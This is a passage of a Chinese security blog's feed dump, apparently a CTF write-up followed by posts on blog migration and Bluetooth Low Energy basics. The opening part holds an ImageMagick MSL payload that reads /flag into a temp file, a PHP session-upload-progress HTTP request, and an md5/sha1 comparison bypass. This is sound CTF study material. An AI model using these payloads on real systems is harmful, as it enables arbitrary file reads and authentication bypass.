punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!-- 将上⼀张图⽚和这次读取的flag进⾏拼接 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 不断重复，如果读取超出范围，便会报错，并留下上⼀次写⼊的⽂件 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+2<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+3<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+4<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+4<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+5<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+5<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一些脏trick"><a href="#一些脏trick" class="headerlink" title="一些脏trick"></a>一些脏trick</h3><h4 id="php-session-not-started"><a href="#php-session-not-started" class="headerlink" title="php session not started"></a>php session not started</h4><p>想办法整个session，利⽤SESSION UPLOAD PROGRESS创建⼀个 session，这样就可以看到源码了</p><pre class="line-numbers language-http"><code class="language-http">POST / HTTP/1.1<span class="token header-name keyword">Host:</span> 115.239.215.75:8081<span class="token header-name keyword">Cookie:</span> PHPSESSID=1<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Length:</span> 204--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="PHP_SESSION_UPLOAD_PROGRESS";<span class="token header-name keyword">Content-Type:</span> application/octet-stream1--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="绕过md5以及sha1强比较"><a href="#绕过md5以及sha1强比较" class="headerlink" title="绕过md5以及sha1强比较"></a>绕过md5以及sha1强比较</h4><p>利用 Error&#x2F;Exception 内置类进行hash绕过。</p><p><code>$a = new Error(&quot;null&quot;,1);$b = new Error(&quot;null&quot;,1);</code></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
            <tag> PHP安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>换博客啦</title>
      <link href="/2022/11/14/huan-bo-ke-la/"/>
      <url>/2022/11/14/huan-bo-ke-la/</url>
      
        <content type="html"><![CDATA[<p>最近短信提示我：一年前买的腾讯云服务器即将过期。依稀记得当时只花了几十块钱就买了一台配置还不错的服务器。心想腾讯真大气，毕竟当时也类比三家，发现国外的vps一年要一百多。如今一年过去了，点开控制台一看续费价格人要晕掉了。一个月就要140人民币，这tmd是抢钱啊！！！<br>于是我决定把博客迁移到github上去，想来想去也就知道hexo了。花了不到一天的时间搞搞定，不是我说，hexo真比zblog好了十个阿伟罗吧！！支持主题多、生态好，两行命令上传博客、不用花钱买服务器、时间成本低、效果还好。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 国内服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低功耗蓝牙BLE简述</title>
      <link href="/2022/11/01/ble-xue-xi-bi-ji/"/>
      <url>/2022/11/01/ble-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="BLE简述"><a href="#BLE简述" class="headerlink" title="BLE简述"></a>BLE简述</h3><ul><li>BLE（低能耗蓝牙）首次出现在蓝牙规范4.0版本中。BLE是作为其前身经典蓝牙BR&#x2F;EDR的替代。下图是传统蓝牙（BT）与BLE的区别，从图可知相比BT，BLE的功耗小，支持距离大。</li></ul><div align=center><img src="https://img-blog.csdnimg.cn/20210513101058738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FsZXhjZWw=,size_16,color_FFFFFF,t_70" alt="摘录" style="zoom:100%;" /></div><ul><li><p>BLE除了点对点通信，还支持广播模式：允许一个设备同时向无限数量的接收者传输数据。每个设备都能与网络中的任何其他设备进行通信。其中，点对点通信包括面向连接通信以及无连接通信，广播模式只有无连接通信（废话QAQ）。</p></li><li><p>BLE的频段和WIFI一样都是2.402 – 2.480 GHz，每个信道之间间隔为2hz，因此有40个信道。其中37，38，39为广播信道，这里需要说明37,38,39只是逻辑顺序(即Channel Index)，从物理信道上看是隔着好几条信道的，这是因为要防止收到数据传输信道的干扰导致三条广播信道全部无法正常工作。其它37个为数据传输信道。下表为蓝牙官方给出BLE与经典蓝牙的区别。</p></li></ul><table><thead><tr><th align="center">Attribution</th><th align="center">Bluetooth Low Energy (LE)</th><th align="center">Bluetooth Classic</th></tr></thead><tbody><tr><td align="center">频段范围</td><td align="center">2.4GHz ISM Band (2.402 – 2.480 GHz Utilized)</td><td align="center">2.4GHz ISM Band (2.402 – 2.480 GHz Utilized)</td></tr><tr><td align="center">信道</td><td align="center">40 channels with 2 MHz spacing (3 advertising channels&#x2F;37 data channels)</td><td align="center">79 channels with 1 MHz spacing</td></tr><tr><td align="center">通道使用信息</td><td align="center">FHSS（跳频）</td><td align="center">FHSS（跳频）</td></tr><tr><td align="center">调制技术</td><td align="center">GFSK</td><td align="center">GFSK, π&#x2F;4 DQPSK, 8DPSK</td></tr><tr><td align="center">传输速率</td><td align="center">LE 2M PHY: 2 Mb&#x2F;s LE 1M PHY: 1 Mb&#x2F;s LE Coded PHY (S&#x3D;2): 500 Kb&#x2F;s LE Coded PHY (S&#x3D;8): 125 Kb&#x2F;s</td><td align="center">EDR PHY (8DPSK): 3 Mb&#x2F;s EDR PHY (π&#x2F;4 DQPSK): 2 Mb&#x2F;s BR PHY (GFSK): 1 Mb&#x2F;s</td></tr><tr><td align="center">发射速率</td><td align="center">≤ 100 mW (+20 dBm)</td><td align="center">≤ 100 mW (+20 dBm)</td></tr><tr><td align="center">Rx Sensitivity</td><td align="center">LE 2M PHY: ≤-70 dBm LE 1M PHY: ≤-70 dBm LE Coded PHY (S&#x3D;2): ≤-75 dBm LE Coded PHY (S&#x3D;8): ≤-82 dBm</td><td align="center">≤-70 dBm</td></tr><tr><td align="center">数据传输</td><td align="center">Asynchronous Connection-oriented Isochronous Connection-oriented Asynchronous Connectionless Synchronous Connectionless Isochronous Connectionless</td><td align="center">Asynchronous Connection-oriented Synchronous Connection-oriented</td></tr><tr><td align="center">通信手段</td><td align="center">Point-to-Point (including piconet) Broadcast Mesh</td><td align="center">Point-to-Point (including piconet)</td></tr><tr><td align="center">Positioning Features</td><td align="center">Presence: Advertising Direction: <a href="https://www.bluetooth.com/zh-cn/learn-about-bluetooth/recent-enhancements/direction-finding/">Direction Finding</a> (AoA&#x2F;AoD) Distance: RSSI, <a href="https://www.bluetooth.com/zh-cn/specifications/in-development/">HADM</a> (Coming)</td><td align="center">None</td></tr></tbody></table><ul><li>想想蓝牙的应用，如手机与蓝牙耳机、电脑与无线鼠标，显然他们是C&#x2F;S架构。一般而言设备提供服务，因此设备是server，手机使用设备提供的服务，因此手机是client。我们称client为主机，server为从机。</li><li>对于蓝牙服务端设备而言（注意我们只关注BLE通信），它们收集信息存储起来，客户端发送一条命令实际上就是获取服务端存储起来的数据。因此可以说服务其实就是各种有价值的数据。</li></ul><h3 id="BLE规格"><a href="#BLE规格" class="headerlink" title="BLE规格"></a>BLE规格</h3><p>官方文档截的图，目前还不太能理解，等理解深刻之后才回来看看。</p><div align=center><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221026181024001.png" alt="image-20221026181024001" style="zoom:67%;" /></div><h3 id="物理信道"><a href="#物理信道" class="headerlink" title="物理信道"></a>物理信道</h3><p>在总结中已经提到，BLE 工作在 2.4GHz 的频段上，分为 40 个 RF 信道，每个信道间隔2MHZ。同一时刻，只能用一个信道进行数据的传输&#x2F;接收。</p><p>这 40 个 RF Channel 上，并不是平等的， 可以看到SIG 把物理信道转换成为一个叫做 Channel Index 。物理信道从 0 - 39 进行编号。而Channel Index为PHY Ch0 对应 37，PHY Ch12 对应 38，PHY 39 对应 39：</p><div align=center><img src="https://img-blog.csdnimg.cn/2019070323511170.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pob3V0YW9wb3dlcg==,size_16,color_FFFFFF,t_70" alt="img" style="zoom:67%;" /></div><p>问：为什么这三个广播信道之间隔好几个信道？</p><p>答：因为如WIFI也用的2.4GHZ，很有可能蓝牙信号被干扰，而广播信道隔开设计就是为了避免数据信道被干扰导致广播信道不可用。偷个图说明：</p><div align=center><img src="https://pic1.zhimg.com/v2-b98249bf73445515154af85f462326b8_r.jpg" referrerpolicy="no-referrer" alt="img"></div><p>除了 37、38、39 这些频段，在 Connection 状态下使用了 其他的 37 个 Channel，通过跳频技术（Hopping），来减少数据干扰，增强系统的可靠性。</p><h3 id="BLE协议栈"><a href="#BLE协议栈" class="headerlink" title="BLE协议栈"></a>BLE协议栈</h3><h4 id="协议栈层次结构"><a href="#协议栈层次结构" class="headerlink" title="协议栈层次结构"></a>协议栈层次结构</h4><p>下图说明了BLE的协议栈构成。可以看到本身蓝牙官方定义协议栈是由Profiles，HOST主机和Controller控制器组成。 其中在HOST和Controller之中由主机控制器接口（HCI）连接，HCI是它们之间的逻辑接口，注意不是物理组件。在底层物理传输方面，HCI可以用许多不同的方式实现，但逻辑或功能接口总是相同的。</p><p>为了更好理解我们把协议栈分为应用层，协议栈以及radio。协议栈之上就是application应用层，也叫Profiles，一个Profile就是一个功能。比如电池，睡眠，心率这些常见蓝牙设备提供的功能。</p><p>可以看到BLE协议栈自成体系。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221102144739324.png" alt="image-20221102144739324" style="zoom:50%;align:center;"/><h4 id="协议栈各层-x2F-协议职能"><a href="#协议栈各层-x2F-协议职能" class="headerlink" title="协议栈各层&#x2F;协议职能"></a>协议栈各层&#x2F;协议职能</h4><p>知识还是比较多的，先总结一下各层职能，之后再详细去看。</p><h5 id="Physical-Layer-物理层"><a href="#Physical-Layer-物理层" class="headerlink" title="Physical Layer 物理层"></a>Physical Layer 物理层</h5><p>物理层定义了无线电发射器&#x2F;接收器如何用于编码和解码数字数据的传输和接收，以及其他适用的无线电相关参数和属性。</p><h5 id="Link-Layer-链路层"><a href="#Link-Layer-链路层" class="headerlink" title="Link Layer 链路层"></a>Link Layer 链路层</h5><p>LL层是整个BLE协议栈的核心。这一层定义了空中接口数据包的格式，具体在哪一个时间点把数据包发送出去，怎么保证数据的完整性，ACK如何接收，如何进行重传，以及如何对链路进行管理和控制等等。LL层不负责解析，只规定格式，对数据进行怎样的解析则交给上面的GAP或者ATT。</p><h5 id="HCI-主机-控制-接口"><a href="#HCI-主机-控制-接口" class="headerlink" title="HCI 主机-控制-接口"></a>HCI 主机-控制-接口</h5><p>HOST和Controller之间的桥梁。为HOST和Controller之间的命令和数据的双向通信提供一个明确的功能接口。</p><h5 id="L2CAP层"><a href="#L2CAP层" class="headerlink" title="L2CAP层"></a>L2CAP层</h5><p>对上层进行多路复用，支持对上层PDU的分割和重组，支持流量控制。LL只关心传输的数据自己，L2CAP就要区分是加密通道仍是普通通道，同时还要对链接间隔进行管理。</p><h5 id="ATT-数据交互协议"><a href="#ATT-数据交互协议" class="headerlink" title="ATT 数据交互协议"></a>ATT 数据交互协议</h5><p>ATT层用来定义用户命令及命令操作的数据，它的关键就是命令。</p><p>ATT命令可以大致分为4类：read读，write写，notify(通知)和indicate(指示)。这些命令又可以分成两种：如果它需要response，那么会在相应命令后面加上request；相反，如果它只需要ACK而不需要response，那么它的后面就不会带request。<strong>ATT的每个命令发出去之后，会立马等ACK信息，如果收到了ACK包，发送方认为命令完成；否则发送方会一直重传该命令直到超时导致BLE连接断开</strong>。</p><p>BLE协议栈中，开发者接触最多的就是ATT。<strong>BLE引入了attribute概念，用来描述一条一条的数据</strong>。Attribute除了定义数据，同时定义该数据可使用的ATT命令，所以这一层被称为ATT层。注意：ATT也是蓝牙空口包中的最上层</p><h5 id="SMP-安全管理层"><a href="#SMP-安全管理层" class="headerlink" title="SMP 安全管理层"></a>SMP 安全管理层</h5><p>SMP用来管理BLE链接的加密和安全，如何保证链接的安全性，同时不影响用户的体验。</p><h5 id="GATT"><a href="#GATT" class="headerlink" title="GATT"></a>GATT</h5><p>GATT用来规范attribute中的数据内容，并运用group（分组）的概念对attribute进行分类管理。没有GATT，BLE协议栈也能跑，但互联互通就会出问题，也正是由于有了GATT和各类各样的应用profile，BLE摆脱了ZigBee等无线协议的兼容性困境，成了出货量最大的2.4G无线通讯产品。</p><h5 id="GAP"><a href="#GAP" class="headerlink" title="GAP"></a>GAP</h5><p>定义了在非连接状态下可使用的操作模式和程序，比如发起广播，扫描和发起连接。定义了安全级别和模式。</p><h3 id="BLE连接状态及过程"><a href="#BLE连接状态及过程" class="headerlink" title="BLE连接状态及过程"></a>BLE连接状态及过程</h3><p>BLE设备有七种状态：</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221102145101332.png" alt="image-20221102145101332" style="zoom:80%;align:center" /><h4 id="就绪态-Standby"><a href="#就绪态-Standby" class="headerlink" title="就绪态 Standby"></a>就绪态 Standby</h4><p>可以理解为摆烂状态。</p><p>处于就绪态的链路层什么也不干，一旦链路层接收到应用层指令那么设备就会进入到相应的状态，一旦设备空闲下来，则又会进入就绪态。</p><h4 id="广播态-Advertising"><a href="#广播态-Advertising" class="headerlink" title="广播态 Advertising"></a>广播态 Advertising</h4><p>广播态的功能，就是让周围设备能够发现自己。</p><p>处于广播态的链路层会发送广播报文，该报文会被周围设备搜索并解析出来，广播报文的内容包括了设备是否可被连接，设备的名字，设备的地址，设备提供的服务及其他相关信息。收到广播报文的设备可以发送回应报文，广播态的链路层还可以监听这种回应报文，并作出响应。</p><h4 id="扫描态-Scanning"><a href="#扫描态-Scanning" class="headerlink" title="扫描态 Scanning"></a>扫描态 Scanning</h4><p>扫描态的主要功能，就是接受广播报文以发现周围的设备。扫描过程可以分为主动扫描和被动扫描。</p><p>被动扫描，就是监听（广播）信道，并且不会向周围发送任何报文，周围设备发送的非定向广播报文都可以被接收到。非定向报文是指，没有指定报文接收地址的报文。</p><p>主动扫描，就是主动发出扫描请求的报文，处于广播状态的链路层会监听这种报文，收到广播报文后还可以发送报文询问详细信息，接收方收到报文后会发出回应报文，这种回应报文是定向报文，只能被发出扫描请求的设备接收并解析出来。</p><h4 id="连接态-Connecting"><a href="#连接态-Connecting" class="headerlink" title="连接态 Connecting"></a>连接态 Connecting</h4><p>连接态，顾名思义就是设备连接建立完成之后的状态，从应用层的角度来看，两个设备已经成功建立了物理连接，并且可以交互用户数据了。</p><h4 id="发起态-Initiating"><a href="#发起态-Initiating" class="headerlink" title="发起态 Initiating"></a>发起态 Initiating</h4><p>发起态，是准备发起连接到连接完成前的一段状态，它的功能是完成连接所需要的所有过程。</p><h4 id="等时广播状态-Isochronous-Broadcasting"><a href="#等时广播状态-Isochronous-Broadcasting" class="headerlink" title="等时广播状态 Isochronous Broadcasting"></a>等时广播状态 Isochronous Broadcasting</h4><p>等时广播状态可以通过广播通道发送BIS(Broadcast Isochronous Stream) 数据报文，由Standby状态进入。想向一定区域内其它设备广播同步数据流（比如音频数据流）的设备需要处于Isochronous Broadcasting状态，处于该状态的设备称为Isochronous Broadcaster。处于Isochronous Broadcasting状态的链路层状态机应发送由一个或多个BIS 组成的BIG(Broadcast Isochronous Group)，每个BIG最多包含31个BIS，每个BIS承载一个单独的同步数据流。传输第一个BIS 数据报文后链路层应通知主机，若停止同步广播则回到Standby状态。</p><p>总而言之，这玩意儿有点像并发，貌似QOS的拥塞控制的定制队列也是这个思想（把数据包分成不同的队列，轮询的向队列取数据，每次只取一个）</p><h4 id="同步接收状态-Synchronization"><a href="#同步接收状态-Synchronization" class="headerlink" title="同步接收状态 Synchronization"></a>同步接收状态 Synchronization</h4><p>可以通过广播通道接收BIS同步数据流，由Standby状态进入。Synchronization状态可用于侦听一定区域内的BIS广播同步数据流（比如音频数据流），处于Synchronization状态并且正在接收同步数据包的设备称为Synchronized Receiver，只能单向接收BIG，如果在主机指定时间内未侦听到任何有效BIG，处于该状态的设备将回到Standby状态并通知主机。</p><h4 id="Isochronous-Broadcaster-—-Synchronized-Receiver"><a href="#Isochronous-Broadcaster-—-Synchronized-Receiver" class="headerlink" title="Isochronous Broadcaster — Synchronized Receiver"></a>Isochronous Broadcaster — Synchronized Receiver</h4><p>给出一篇博客的例子。</p><p>等时广播者与同步接收者之间通过广播信道传输同步数据流BIS（比如音频数据流），等时同步广播通信也是一种一对多的通信方式，是在Bluetooth 5.2 中新增的，同样只能进行单方向通信，比如可以让听讲座的众多观众借助支持该通信模式的蓝牙耳机同步听到一个演讲者等时广播的音频数据流；</p><h4 id="常见连接示例"><a href="#常见连接示例" class="headerlink" title="常见连接示例"></a>常见连接示例</h4><p>比如手机A要连接华为手环B，首先华为手环B进入广播态向周围设备发起广播报文，A进入扫描态通过scanner模块接受B发的广播报文，发现该设备信息后，A进入发起态，向B发起连接请求，B接收到连接请求后，确认是与本身通讯向广播者发响应信息，这样当广播者和接受者都有了对方的身份信息时，即表示双方连接成功，A、B进入连接态。<br>手机A：Standby—-&gt;Scanning—-&gt;Initiating—-&gt;Connection</p><p>华为手环B：Standby—-&gt;Advertising—-&gt;Connection</p><p>此时我们把手机A称为主机，华为手环B称为从机。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>1.<a 